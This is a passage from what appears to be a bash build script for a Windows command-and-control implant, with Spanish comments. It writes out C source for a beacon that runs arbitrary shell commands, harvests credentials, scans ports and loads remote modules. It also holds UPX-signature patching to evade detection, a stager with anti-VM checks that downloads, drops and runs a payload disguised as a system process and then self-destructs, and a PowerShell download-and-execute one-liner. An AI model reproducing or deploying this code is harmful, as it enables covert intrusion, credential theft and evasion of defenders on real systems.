        PortScannerArgs* args = malloc(sizeof(PortScannerArgs));
        strcpy(args->targetIP, target);
        memcpy(args->ports, lazyconf.ports, lazyconf.num_ports * sizeof(int));
        args->numPorts = lazyconf.num_ports;

        _beginthread(PortScannerWrapper, 0, args);

        snprintf(output, sizeof(output), "Port scan started on %s", target);
        goto send_response;
    }

    if (strncmp(command, "exfil:", 6) == 0) {
        const char* path = command + 6;
        char* creds = searchCredentials(path);
        if (creds) {
            strncpy(output, creds, sizeof(output) - 1);
            free(creds);
        } else {
            strncpy(error, "No credentials found", sizeof(error) - 1);
        }
        goto send_response;
    }
    if (strncmp(command, "compressdir:", 12) == 0) {
        char* dir_path = command + 12;
        if (compressDirectory(dir_path)) {
            snprintf(output, sizeof(output), "Directory compressed: %s.zip", dir_path);
        } else {
            snprintf(error, sizeof(error), "Failed to compress directory");
        }
        goto send_response;
    }

    if (strncmp(command, "netconfig:", 10) == 0) {
        char* result = getNetworkConfig();
        if (result) {
            strncpy(output, result, sizeof(output) - 1);
            free(result);
        } else {
            strncpy(error, "Failed to get network config", sizeof(error) - 1);
        }
        goto send_response;
    }

    // --- Simulación y utilidades ---
    if (strncmp(command, "simulate:", 9) == 0) {
        _beginthread(simulateLegitimateTraffic, 0, NULL);
        snprintf(output, sizeof(output), "Simulated legitimate traffic started");
        goto send_response;
    }

    if (strncmp(command, "softenum:", 9) == 0) {
        char* soft = GetUsefulSoftware();
        if (soft && strlen(soft) > 0) {
            snprintf(output, sizeof(output), "Useful software: %s", soft);
            free(soft);
        } else {
            snprintf(output, sizeof(output), "No useful software found");
        }
        goto send_response;
    }

    if (strncmp(command, "load_module:", 12) == 0) {
        char* url = command + 12;
        LoadModuleFromURL(url);
        snprintf(output, sizeof(output), "Módulo cargado: %s", url);
        goto send_response;
    }

    // --- Comando por defecto: ejecutar en shell ---
    printf("[*] Executing system command: %s\n", command);
    fflush(stdout);
    
    FILE* pipe = _popen(command, "r");
    if (pipe) {
        while (fgets(line, sizeof(line), pipe) && 
            output_len < sizeof(output) - 1) {
            
            size_t line_len = strlen(line);
            size_t available = sizeof(output) - output_len - 1;
            
            if (line_len <= available) {
                memcpy(output + output_len, line, line_len);
                output_len += line_len;
            } else {
                // Copiar lo que quepa
                memcpy(output + output_len, line, available);
                output_len += available;
                break;
            }
        }
        
        output[output_len] = '\0';
        
        int result = _pclose(pipe);
        if (result == -1) {
            snprintf(error, sizeof(error), "Error closing pipe: %s", command);
        }
    } else {
        snprintf(error, sizeof(error), "Failed to execute: %s (GetLastError: %lu)", 
                command, GetLastError());
    }

send_response:
   cJSON *json_obj = cJSON_CreateObject();
    if (!json_obj) {
        printf("[-] Failed to create JSON object\n");
        goto send_response;
    }

    cJSON_AddStringToObject(json_obj, "id", "windows" && strlen("windows") > 0 ? "windows" : "windows");
    cJSON_AddStringToObject(json_obj, "output", output && strlen(output) > 0 ? output : "Command executed with no output");
    cJSON_AddStringToObject(json_obj, "error", error ? error : "");
    cJSON_AddStringToObject(json_obj, "hostname", hostname ? hostname : "unknown");
    cJSON_AddStringToObject(json_obj, "ips", ips ? ips : "unknown");
    cJSON_AddStringToObject(json_obj, "user", user ? user : "unknown");
    cJSON_AddNumberToObject(json_obj, "pid", (double)GetCurrentProcessId());
    cJSON_AddStringToObject(json_obj, "client", "windows");
    cJSON_AddStringToObject(json_obj, "command", command ? command : "unknown");
    cJSON_AddStringToObject(json_obj, "discovered_ips", discoveredLiveHosts ? discoveredLiveHosts : "");
    cJSON_AddStringToObject(json_obj, "result_portscan", portScanResults ? portScanResults : "");
    cJSON_AddStringToObject(json_obj, "result_pwd", result_pwd ? result_pwd : "");


    printf("[DEBUG] Variables antes del JSON:\n");
    printf("[DEBUG] id_atomic: '%s'\n", id_atomic ? id_atomic : "NULL");
    printf("[DEBUG] output: '%s'\n", output ? output : "NULL");
    printf("[DEBUG] error: '%s'\n", error ? error : "NULL");
    printf("[DEBUG] hostname: '%s'\n", hostname ? hostname : "NULL");
    printf("[DEBUG] ips: '%s'\n", ips ? ips : "NULL");
    printf("[DEBUG] user: '%s'\n", user ? user : "NULL");
    printf("[DEBUG] command: '%s'\n", command ? command : "NULL");
    printf("[DEBUG] discoveredLiveHosts: '%s'\n", discoveredLiveHosts ? discoveredLiveHosts : "NULL");
    printf("[DEBUG] portScanResults: '%s'\n", portScanResults ? portScanResults : "NULL");
    printf("[DEBUG] result_pwd: '%s'\n", result_pwd ? result_pwd : "NULL");
    fflush(stdout);

    char *json_str = cJSON_PrintUnformatted(json_obj);
    snprintf(error, sizeof(error), "[?]JSON object\n: %s", json_str);
    fflush(stdout);
    cJSON_Delete(json_obj);
    if (!json_str) {
        printf("[-] Failed to print JSON\n");
        fflush(stdout);
        goto send_response;
    }

    
    char url[512];
    snprintf(url, sizeof(url), "%s%s%s", C2_URL, MALEABLE, CLIENT_ID);

    char *encrypted = encrypt_data(json_str);
    if (encrypted) {
        printf("[+] before retry_http_request if encrypted\n");
        fflush(stdout);
        retry_http_request(url, "POST", encrypted, MAX_RETRIES);
        free(encrypted);
    } else {
        printf("[-] Encryption failed\n");
        fflush(stdout);
    }

    
    cJSON_free(json_str);  

    if (hostname) free(hostname);
    if (ips) free(ips);
    if (user) free(user);
}
// main.c
int main() {
    printf("[*] main niam...\n");
    fflush(stdout);
    srand(time(NULL));
    xor_string((char*)OBF_TARGET_PROCESS, sizeof(OBF_TARGET_PROCESS)-1, XOR_KEY);
    xor_string((char*)OBF_USER_AGENT, sizeof(OBF_USER_AGENT)-1, XOR_KEY);
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    hex_to_bytes(aes_key_hex, aes_key, 32);
    // Cargar configuración
    if (!load_lazyconf()) {
        printf("[-] Using fallback config (failed to reach C2 at %ls:%d)\n", LC2_HOST, C2_PORT);
        fflush(stdout);

        lazyconf.reverse_shell_port = 5555;

        strncpy(lazyconf.debug_implant, "False", sizeof(lazyconf.debug_implant) - 1);
        lazyconf.debug_implant[sizeof(lazyconf.debug_implant) - 1] = '\0';

        // Si no hay puertos definidos, usar puertos por defecto
        if (lazyconf.num_ports == 0) {
            int default_ports[] = {22, 80, 443, 445, 3389};
            lazyconf.num_ports = 5;
            memcpy(lazyconf.ports, default_ports, sizeof(default_ports));
        }

        // Si no hay rhost definido, usar LC2_HOST como fallback (pero es wchar_t, hay que convertir)
        if (strlen(lazyconf.rhost) == 0) {
            wcstombs(lazyconf.rhost, LC2_HOST, sizeof(lazyconf.rhost) - 1);
            lazyconf.rhost[sizeof(lazyconf.rhost) - 1] = '\0';
        }
    }

    // Inicializar contexto AES
    PacketEncryptionContext* encryptionCtx = init_aes_context(
        "36870130f03bf0bba5c8ed1d3e27117891ab415c5ea6cdbcb8731ef8fc218124"
    );
    printf("[D] AES Key: ");
    for (int i = 0; i < 32; i++) {
        printf("%02x ", aes_key[i]);
    }
    printf("\n");
    fflush(stdout);
    // Inicializar ruta actual
    char pwd[MAX_PATH];
    if (GetCurrentDirectoryA(MAX_PATH, pwd)) {
        result_pwd = _strdup(pwd);
    } else {
        result_pwd = _strdup("unknown");
    }

    // Bucle principal
    while (1) {
        char* command = GetC2Command(C2_HOST, C2_PATH);
        if (command && strlen(command) > 0) {
            handleAdversary(command);
            free(command);
        }
        Sleep(GetJitteredSleep(SLEEP_BASE));
    }

    return 0;
}
EOF



echo "[+] Generated beacon.c"
make windows
make clean
make upx
echo "[+] Compiled: $OUTPUT"

# Verificar que el archivo existe
if [[ ! -f "$OUTPUT" ]]; then
    echo "Error: $OUTPUT no encontrado" >&2
    exit 1
fi

perl -e '
    $key = 0x33;
    open my $fh, "<", $ARGV[0] or die $!;
    binmode $fh;
    while (read($fh, $byte, 1)) {
        print chr(ord($byte) ^ $key);
    }
' "$OUTPUT" | base64 > "$BEACON"

echo "[+] Backup: $OUTPUT -> $BACKUP"
cp "$OUTPUT" "$BACKUP"

crc32() {
    python3 -c "
import sys
import zlib
try:
    with open('$1', 'rb') as f:
        data = f.read()
        crc = zlib.crc32(data) & 0xFFFFFFFF
        print('%08X' % crc)
except Exception as e:
    print('ERROR: %s' % e, file=sys.stderr)
    sys.exit(1)
"
}

echo "[+] CRC32 inicial:"
crc32 "$OUTPUT" || { echo "[-] Error calculando CRC32. ¿Existe el archivo?"; exit 1; }

# 1. Parchear firma UPX! en el cuerpo
echo "[+] Parcheando 'UPX!'..."
perl -i -0777 -pe 's/UPX!.{4}/\0\0\0\0\0\0\0\0/gs' "$OUTPUT"

# 2. Parchear nombres de secciones UPX0, UPX1, UPX2 en cabecera PE (binario exacto)
echo "[+] Parcheando nombres de secciones en cabecera PE..."
perl -i -0777 -pe 's/\x2E\x55\x50\x58\x30\x00\x00\x00/\x2E\x74\x65\x78\x74\x00\x00\x00/gs' "$OUTPUT"  # .UPX0 → .text
perl -i -0777 -pe 's/\x2E\x55\x50\x58\x31\x00\x00\x00/\x2E\x64\x61\x74\x61\x00\x00\x00/gs' "$OUTPUT"  # .UPX1 → .data
perl -i -0777 -pe 's/\x2E\x55\x50\x58\x32\x00\x00\x00/\x2E\x62\x73\x73\x00\x00\x00\x00/gs' "$OUTPUT"  # .UPX2 → .bss

# 3. Parchear cualquier cadena "UPX0", "UPX1", "UPX2" en TODO el binario (no solo headers)
echo "[+] Eliminando cadenas residuales UPX0/UPX1/UPX2 en cuerpo del binario..."
perl -i -0777 -pe 's/UPX0/SEC0/gs; s/UPX1/SEC1/gs; s/UPX2/SEC2/gs' "$OUTPUT"

# 4. Opcional: Parchear cadena de info UPX
echo "[+] Parcheando cadena informativa de UPX (si existe)..."
perl -i -0777 -pe 's/\$Info: This file is packed with the UPX executable packer.*/\$Info: This file is totally legit, bro./gs' "$OUTPUT"

echo "[+] CRC32 tras parches:"
crc32 "$OUTPUT" || { echo "[-] Error calculando CRC32 después del parche."; exit 1; }

echo "[+] Verificando cadenas UPX:"
if strings "$OUTPUT" | grep -i UPX; then
    echo "[-] ¡Ups! Aún quedan rastros. Considera ofuscar más."
else
    echo "[+] ¡Limpio! No se encontraron cadenas UPX. ✅"
fi

echo "[+] ¡Payload listo para entrega! 🚀"

cat > stub.c << EOF
#include <windows.h>
#include <wininet.h>
#include <wincrypt.h>
#include <stdio.h>
#include <process.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "crypt32.lib")

// === CONFIGURACIÓN ===
#define C2_URL "http://$C2_HOST/beacon.enc"
#define XOR_KEY 0x33
#define MAX_PAYLOAD_SIZE (1024 * 1024 * 10)  // 10 MB

// === ESTRUCTURAS Y HELLGATE (solo para evasión de análisis) ===
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA {
    DWORD Length;
    DWORD Initialized;
    PVOID SsHandle;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    LIST_ENTRY InLoadOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PPEB_LDR_DATA Ldr;
} PEB, *PPEB;

void selfDestruct();

void selfDestruct() {
    printf("[*] Initiating self-destruct...\\n");
    fflush(stdout);
    
    char exePath[MAX_PATH];
    if (!GetModuleFileNameA(NULL, exePath, MAX_PATH)) {
        printf("[-] Failed to get executable path\\n");
        return;
    }
    
    // Eliminar del registro
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, 
        "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, "SystemMaintenance");
        RegCloseKey(hKey);
    }
    
    // Eliminar tarea programada
    system("schtasks /delete /tn \\"SystemMaintenanceTask\\" /f > nul 2>&1");
    
    // Preparar comando PowerShell robusto, ESCAPADO PARA BASH
    char cmd[2048];
    snprintf(cmd, sizeof(cmd),
        "cmd.exe /c "
        "timeout /t 3 > nul & "
        "powershell -Command \""
            "\$ErrorActionPreference='SilentlyContinue'; "
            "for(\$i=0; \$i -lt 5; \$i++){ "
                "Start-Sleep -Seconds 2; "
                "try{ Remove-Item -Force -Path '%s' -ErrorAction Stop; exit } catch{} "
            "}; "
            "Remove-ItemProperty -Path 'HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' -Name 'SystemMaintenance' -ErrorAction SilentlyContinue"
        "\" > nul 2>&1",
        exePath);
    
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    
    if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 
                      CREATE_NO_WINDOW | DETACHED_PROCESS,
                      NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    } else {
        printf("[-] Failed to spawn cleanup process\n");
    }
    
    printf("[+] Self-destruct sequence activated. Exiting now...\n");
    fflush(stdout);
    
    ExitProcess(0);
}

HMODULE GetNtdllBase() {
    PEB* peb;
#ifdef _WIN64
    __asm__ volatile ("movq %%gs:0x60, %0" : "=r" (peb));
#else
    __asm__ volatile ("movl %%fs:0x30, %0" : "=r" (peb));
#endif

    if (!peb || !peb->Ldr) return NULL;

    LIST_ENTRY* list = peb->Ldr->InMemoryOrderModuleList.Flink;
    LIST_ENTRY* head = list;

    do {
        LDR_DATA_TABLE_ENTRY* entry = (LDR_DATA_TABLE_ENTRY*)((BYTE*)list - 0x10);
        if (entry->BaseDllName.Length == 20 && entry->BaseDllName.Buffer) {
            if (entry->BaseDllName.Buffer[0] == L'n' &&
                entry->BaseDllName.Buffer[1] == L't' &&
                entry->BaseDllName.Buffer[2] == L'd' &&
                entry->BaseDllName.Buffer[3] == L'l' &&
                entry->BaseDllName.Buffer[4] == L'l' &&
                entry->BaseDllName.Buffer[5] == L'.' &&
                entry->BaseDllName.Buffer[6] == L'd' &&
                entry->BaseDllName.Buffer[7] == L'l' &&
                entry->BaseDllName.Buffer[8] == L'l') {
                return (HMODULE)entry->DllBase;
            }
        }
        list = list->Flink;
    } while (list != head);

    return GetModuleHandleA("ntdll.dll");
}

// === ANTI-ANALYSIS ===
BOOL anti_analysis() {
    if (IsDebuggerPresent()) return TRUE;

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\\\DESCRIPTION\\\\System", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char buffer[256];
        DWORD size = sizeof(buffer);
        if (RegQueryValueExA(hKey, "SystemBiosVersion", NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
            if (strstr(buffer, "VMWARE") || strstr(buffer, "VBOX") || strstr(buffer, "QEMU") || strstr(buffer, "XEN")) {
                RegCloseKey(hKey);
                return TRUE;
            }
        }
        RegCloseKey(hKey);
    }

    if (GetTickCount() < 60000) return TRUE;

    MEMORYSTATUSEX mem;
    mem.dwLength = sizeof(mem);
    if (GlobalMemoryStatusEx(&mem) && mem.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return TRUE;

    return FALSE;
}

// === XOR + BASE64 ===
void xor_data(unsigned char* data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= XOR_KEY;
    }
}

BOOL base64_decode(LPCSTR input, DWORD input_len, BYTE** output, DWORD* output_len) {
    *output_len = 0;
    if (!CryptStringToBinaryA(input, input_len, CRYPT_STRING_BASE64, NULL, output_len, NULL, NULL)) return FALSE;
    *output = (BYTE*)HeapAlloc(GetProcessHeap(), 0, *output_len);
    return *output && CryptStringToBinaryA(input, input_len, CRYPT_STRING_BASE64, *output, output_len, NULL, NULL);
}

// === DESCARGA ===
HGLOBAL download_payload() {
    Sleep(rand() % 15000 + 10000);  // Jitter 10-25 seg

    HINTERNET hInt = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                                   INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInt) return NULL;

    HINTERNET hConn = InternetOpenUrlA(hInt, C2_URL, NULL, 0,
                                       INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hConn) { InternetCloseHandle(hInt); return NULL; }

    char* buffer = (char*)HeapAlloc(GetProcessHeap(), 0, MAX_PAYLOAD_SIZE);
    if (!buffer) { InternetCloseHandle(hConn); InternetCloseHandle(hInt); return NULL; }

    DWORD total = 0;
    DWORD read;
    BOOL success = FALSE;

    while (InternetReadFile(hConn, buffer + total, 4096, &read) && read > 0) {
        total += read;
        if (total >= MAX_PAYLOAD_SIZE) break;
    }

    success = (total > 0);
    InternetCloseHandle(hConn);
    InternetCloseHandle(hInt);

    if (!success || total == 0) {
        HeapFree(GetProcessHeap(), 0, buffer);
        return NULL;
    }

    HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, total);
    if (hMem) {
        void* pMem = GlobalLock(hMem);
        if (pMem) {
            memcpy(pMem, buffer, total);
            GlobalUnlock(hMem);
        }
    }
    HeapFree(GetProcessHeap(), 0, buffer);
    return hMem;
}

// === MAIN ===
int main() {
    srand(GetTickCount());

    // Anti-analysis
    if (anti_analysis()) return 1;

    // Descargar
    HGLOBAL hPayload = download_payload();
    if (!hPayload) return 1;

    DWORD raw_len;
    BYTE* raw_payload = NULL;
    char* base64_data = (char*)GlobalLock(hPayload);
    if (!base64_decode(base64_data, GlobalSize(hPayload), &raw_payload, &raw_len)) {
        GlobalUnlock(hPayload);
        GlobalFree(hPayload);
        return 1;
    }
    GlobalUnlock(hPayload);
    GlobalFree(hPayload);

    xor_data(raw_payload, raw_len);

    // Obtener %TEMP%
    char temp_path[MAX_PATH];
    if (!GetTempPathA(MAX_PATH, temp_path)) {
        HeapFree(GetProcessHeap(), 0, raw_payload);
        return 1;
    }

    // Nombre aleatorio más realista
    char target_path[MAX_PATH];
    const char* prefixes[] = { "svchost", "dllhost", "msiexec", "wmiprvse", "spoolsv" };
    sprintf(target_path, "%s%s.exe", temp_path, prefixes[rand() % 5]);

    // Escribir archivo - SIN DELETE_ON_CLOSE
    HANDLE hFile = CreateFileA(target_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        HeapFree(GetProcessHeap(), 0, raw_payload);
        return 1;
    }

    DWORD written;
    BOOL success = WriteFile(hFile, raw_payload, raw_len, &written, NULL);
    CloseHandle(hFile);

    // Liberar payload DESPUÉS de escribir
    HeapFree(GetProcessHeap(), 0, raw_payload);


    // Ejecutar
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    BOOL exec_ok = FALSE;
    if (CreateProcessA(target_path, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        Sleep(2000);  // Esperar a que el beacon inicie
        exec_ok = TRUE;
    }
    Sleep(3000); 
    selfDestruct();
    return exec_ok ? 0 : 1;
}
EOF
x86_64-w64-mingw32-gcc -o stub.exe stub.c -lwininet -ladvapi32 -s -Os -static -fno-stack-protector -lcrypt32 -lmsvcrt && upx --best --ultra-brute  stub.exe
echo "powershell -c \"Invoke-WebRequest 'http://$C2_HOST/stub.exe' -OutFile 'stub.exe'; Start-Process 'stub.exe'\""
# === GENERAR ID ALEATORIO (12 caracteres alfanuméricos) ===
ID=$(head /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 12 | head -n 1)

# === FECHA ACTUAL ===
CREATED=$(date '+%Y-%m-%d %H:%M:%S')

# === RUTA DEL BINARIO (ajusta según tu estructura) ===
BINARY_PATH="$(pwd)/${OUTPUT}"
WORKING_PATH="$(pwd)"

# === PAYLOAD (usando C2_HOST y OUTPUT) ===
PAYLOAD="powershell -c 'Invoke-WebRequest 'http://${C2_HOST}/${OUTPUT}' -OutFile '${OUTPUT}'; Start-Process '${OUTPUT}''"

# === GENERAR EL ARCHIVO JSON ===
cat > implant_config_$CLIENT_ID.json << EOF
{
    "id": "$ID",
    "name": "$CLIENT_ID",
    "binary": "$BINARY_PATH",
    "url_binary": "http://${C2_HOST}/${OUTPUT}",
    "os_id": "1",
    "os": "windows",
    "rhost": "",
    "log": "${CLIENT_ID}.log",
    "user_agent": "$USER_AGENT",
    "maleable_route": "$MALEABLE",
    "url": "$URL",
    "sleep": "6",
    "username": "$C2_USER",
    "password": "$C2_PASS",
    "working_path": "$WORKING_PATH",
    "payload": "$PAYLOAD",
    "created": "$CREATED"
}
EOF

echo "✅ Archivo 'implant_config_windows.json' generado correctamente."
